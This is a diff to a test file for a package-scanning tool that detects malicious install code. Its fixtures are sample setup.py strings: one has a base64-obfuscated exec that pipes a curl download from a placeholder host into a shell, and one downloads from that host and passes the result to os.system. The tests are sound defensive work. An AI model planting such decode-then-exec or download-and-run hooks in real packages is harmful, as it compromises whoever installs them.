@@ -26,7 +26,9 @@ def scan(layout: dict[str, str], archive: str = "pkg-1.0.tar.gz.unpacked", top: 
 
 # alias resolution: calls hidden behind imports are still seen (colored-fidget, aeodata, libsock4 shapes)
 f, v = scan({"setup.py": "from base64 import b64decode\nimport x\nexec(b64decode('aGk='))\n"})
-assert f.has_decode_then_exec and v.verdict == "BLOCK", (f.has_decode_then_exec, v.verdict)
+assert f.has_decode_then_exec and v.verdict == "NEEDS_HUMAN_REVIEW", (f.has_decode_then_exec, v.verdict)   # the text chain alone
+f, v = scan({"setup.py": "from base64 import b64decode\nimport x\nexec(b64decode('aW1wb3J0IG9zO29zLnN5c3RlbSgnY3VybCBodHRwOi8veHxzaCcp'))\n"})
+assert f.has_decode_then_exec and v.verdict == "BLOCK", (f.has_decode_then_exec, v.verdict)   # what it runs at install is read
 f, v = scan({"setup.py": "from urllib.request import urlopen as _u\nfrom os import system as _s\n_s(_u('http://x').read())\n"})
 assert f.has_download_then_execute and v.verdict == "BLOCK"
 f, v = scan({"a.py": "_x = exec\n_x(__import__('base64').b64decode('aGk='))\n"})
